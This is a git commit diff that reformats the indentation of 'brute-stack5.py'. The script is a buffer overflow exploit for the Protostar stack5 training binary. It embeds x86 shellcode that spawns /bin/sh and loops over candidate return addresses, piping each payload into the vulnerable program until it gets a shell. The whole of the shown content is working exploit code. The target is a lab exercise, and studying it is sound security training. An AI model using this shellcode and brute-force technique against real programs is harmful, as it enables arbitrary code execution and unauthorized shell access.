c08208789576e17783f254002edd5563697e63a4
Shin24 <35491855+CP04042K@users.noreply.github.com>
2023-04-30 01:40:26 +0700

    Update brute-stack5.py

--- brute-stack5.py
+++ brute-stack5.py
@@ -8,14 +8,14 @@ eip = 0xbffff6ec+4
 shellcode = "\x90"*0 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 
 for i in range(0, 0x90):
-                f = open("test.txt","w")
-                this_eip = eip + i*4
-                pack_eip = struct.pack("I", this_eip)
-                f.write(padding+pack_eip+shellcode+b'\n')
-                f.close() # close file before cat or else it wont print out result
-                print "[*] EIP: {0} ".format(hex(this_eip))
-                out_ = os.popen("(cat test.txt ; echo id ) | /opt/protostar/bin/stack5").read()
-                if len(out_):
-                        print out_
-                        break
+    f = open("test.txt","w")
+    this_eip = eip + i*4
+    pack_eip = struct.pack("I", this_eip)
+    f.write(padding+pack_eip+shellcode+b'\n')
+    f.close() # close file before cat or else it wont print out result
+    print "[*] EIP: {0} ".format(hex(this_eip))
+    out_ = os.popen("(cat test.txt ; echo id ) | /opt/protostar/bin/stack5").read()
+    if len(out_):
+            print out_
+            break
 
